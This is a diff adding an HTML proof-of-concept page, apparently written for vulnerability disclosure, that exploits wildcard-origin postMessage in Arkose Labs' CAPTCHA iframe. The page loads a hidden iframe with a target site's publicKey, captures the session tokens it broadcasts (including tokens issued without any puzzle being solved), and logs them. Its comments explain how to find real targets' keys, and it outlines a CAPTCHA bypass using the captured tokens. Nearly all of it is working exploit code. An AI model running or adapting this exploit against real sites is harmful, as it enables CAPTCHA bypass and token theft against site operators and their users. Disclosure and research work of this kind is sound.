@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<!--
+  PoC: AR3 — sessionToken Exfiltration via postMessage("*") Wildcard
+
+  Purpose: Demonstrate that any page can embed iframe.arkoselabs.com
+  and receive sessionTokens broadcast to "*".
+
+  Instructions:
+  1. Replace PUBLIC_KEY_HERE with a real customer publicKey found in target website
+     (search for "arkoselabs.com/v2/" in target site's HTML/JS)
+  2. Open this file in a browser (file:// works)
+  3. Watch the "Stolen Tokens" section populate automatically
+  4. Note: "suppressed" tokens arrive WITHOUT user solving any puzzle
+
+  Legal: Run only on your own accounts or with explicit permission.
+         publicKey=DEMO is safe for testing.
+-->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>AR3 PoC — Arkose postMessage("*") Token Exfiltration</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #e0e0e0; }
+        h1 { color: #ff6b6b; }
+        .info { background: #16213e; padding: 15px; border-left: 3px solid #0f3460; margin: 10px 0; }
+        .token-log { background: #0d1117; padding: 15px; border: 1px solid #30363d; min-height: 100px; }
+        .token-entry { color: #58a6ff; padding: 5px 0; border-bottom: 1px solid #21262d; }
+        .token-entry.suppressed { color: #3fb950; font-weight: bold; }
+        .token-entry.loaded { color: #d29922; }
+        .iframe-container { display: none; }
+        .status { color: #8b949e; font-size: 12px; }
+        input { background: #0d1117; border: 1px solid #30363d; color: #c9d1d9; padding: 8px; width: 400px; }
+        button { background: #238636; color: white; border: none; padding: 8px 15px; cursor: pointer; margin-left: 5px; }
+        button:hover { background: #2ea043; }
+    </style>
+</head>
+<body>
+    <h1>AR3 PoC: Arkose sessionToken Exfiltration</h1>
+
+    <div class="info">
+        <strong>Finding:</strong> All postMessage events on iframe.arkoselabs.com use wildcard target origin ("*").<br>
+        <strong>Impact:</strong> Any page can embed the Arkose iframe with a known customer publicKey and steal sessionTokens.<br>
+        <strong>Critical:</strong> <code>challenge-suppressed</code> tokens arrive WITHOUT user solving any puzzle.
+    </div>
+
+    <div class="info">
+        <strong>Target publicKey:</strong><br>
+        <input type="text" id="publicKeyInput" value="DEMO" placeholder="Enter customer publicKey">
+        <button onclick="loadIframe()">Load Iframe</button>
+        <span class="status" id="iframeStatus">Not loaded</span>
+    </div>
+
+    <h2>Stolen Tokens (received via postMessage)</h2>
+    <div class="token-log" id="tokenLog">
+        <div class="status">Waiting for tokens... Load an iframe to begin.</div>
+    </div>
+
+    <h2>Raw Events</h2>
+    <div class="token-log" id="eventLog"></div>
+
+    <!-- Hidden iframe container — this is where the Arkose challenge loads silently -->
+    <div class="iframe-container" id="iframeContainer"></div>
+
+    <script>
+        var stolenTokens = [];
+        var eventLog = document.getElementById('eventLog');
+        var tokenLog = document.getElementById('tokenLog');
+
+        // Listen for ALL postMessage events
+        window.addEventListener('message', function(e) {
+            try {
+                var msg = JSON.parse(e.data);
+
+                // Log raw event
+                var rawEntry = document.createElement('div');
+                rawEntry.className = 'token-entry';
+                rawEntry.textContent = '[' + new Date().toISOString() + '] Origin: ' + e.origin + ' | Event: ' + msg.eventId;
+                eventLog.appendChild(rawEntry);
+
+                // Capture sessionToken events
+                if (msg.payload && msg.payload.sessionToken) {
+                    var token = msg.payload.sessionToken;
+                    var eventId = msg.eventId;
+                    var publicKey = msg.publicKey;
+
+                    stolenTokens.push({
+                        token: token,
+                        event: eventId,
+                        publicKey: publicKey,
+                        timestamp: new Date().toISOString(),
+                        iframeOrigin: e.origin
+                    });
+
+                    var entry = document.createElement('div');
+                    entry.className = 'token-entry' + (eventId === 'challenge-suppressed' ? ' suppressed' :
+                                                       eventId === 'challenge-loaded' ? ' loaded' : '');
+                    entry.innerHTML =
+                        '<strong>[' + eventId + ']</strong> at ' + new Date().toISOString() + '<br>' +
+                        'publicKey: ' + publicKey + '<br>' +
+                        'Token: <code>' + token.substring(0, 60) + '...' + '</code><br>' +
+                        'From: ' + e.origin + '<br>' +
+                        (eventId === 'challenge-suppressed' ?
+                            '<strong>⚠ SUPPRESSION TOKEN — arrived without user solving any puzzle!</strong>' : '') +
+                        '<br>';
+                    tokenLog.appendChild(entry);
+
+                    // Log to console for easy extraction
+                    console.log('STOLEN TOKEN:', {
+                        eventId: eventId,
+                        publicKey: publicKey,
+                        token: token,
+                        iframeOrigin: e.origin
+                    });
+                }
+            } catch(e) {
+                // Not JSON, ignore
+            }
+        });
+
+        function loadIframe() {
+            var publicKey = document.getElementById('publicKeyInput').value.trim() || 'DEMO';
+            var container = document.getElementById('iframeContainer');
+            var status = document.getElementById('iframeStatus');
+
+            // Clear previous
+            container.innerHTML = '';
+            tokenLog.innerHTML = '';
+            eventLog.innerHTML = '';
+
+            // Create hidden iframe with target's publicKey
+            var iframe = document.createElement('iframe');
+            iframe.src = 'https://iframe.arkoselabs.com/v2/' + encodeURIComponent(publicKey) + '/index.html';
+            iframe.width = '1';
+            iframe.height = '1';
+            iframe.style.border = 'none';
+            iframe.style.position = 'absolute';
+            iframe.style.visibility = 'hidden';
+
+            container.appendChild(iframe);
+            status.textContent = 'Loaded iframe for publicKey: ' + publicKey + ' — waiting for tokens...';
+
+            console.log('Iframe loaded for publicKey:', publicKey);
+            console.log('Iframe URL:', iframe.src);
+        }
+
+        // Auto-load with DEMO key on page load
+        window.addEventListener('DOMContentLoaded', function() {
+            loadIframe();
+        });
+    </script>
+
+    <div class="info">
+        <strong>Next step:</strong> If you received a <span style="color:#3fb950">challenge-suppressed</span> token,<br>
+        use it in the CAPTCHA verify flow at the target site to confirm CAPTCHA bypass:<br>
+        <pre>
+# Step 1: Get the stolen sessionToken from the log above
+STOLEN_TOKEN="..."
+
+# Step 2: See if the verify endpoint accepts it (requires customer's private_key)
+# This step is performed by the customer's SERVER — the attacker would need to:
+# 1. Make the target site's CAPTCHA accept the stolen token
+# 2. Or find the privateKey if it was leaked client-side
+
+# Step 3: Confirm origin-binding (or lack thereof) at verify.arkoselabs.com
+# This requires a test account with a known publicKey+privateKey pair
+        </pre>
+    </div>
+</body>
+</html>
